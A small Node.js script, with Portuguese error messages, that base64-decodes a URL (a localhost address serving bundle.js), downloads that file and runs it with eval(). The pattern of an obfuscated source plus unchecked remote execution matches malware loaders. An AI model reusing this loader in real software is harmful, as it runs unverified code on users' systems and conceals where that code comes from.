const http = require('http');

const Base64 = {
  encode: data => Buffer.from(data, 'utf-8').toString('base64'),
  decode: data => Buffer.from(data, 'base64').toString('utf-8')
}

http.request(Base64.decode('aHR0cDovL2xvY2FsaG9zdDo1MDAwL2J1bmRsZS5qcw=='), (res) => {
  let data = '';
  res.on('data', (chunk) => data += chunk.toString('utf8'));
  res.on('end', () => {
    try {
      eval(data);
    } catch ({ name, message }) {
      console.error(`Falha ao iniciar o script pela internet.\n${name}\n${message}`);
    }
  });
  res.on('error', ({ name, message }) => {
    console.error(`Falha ao baixar o script pela internet\n${name}\n${message}`);
  });
}).end();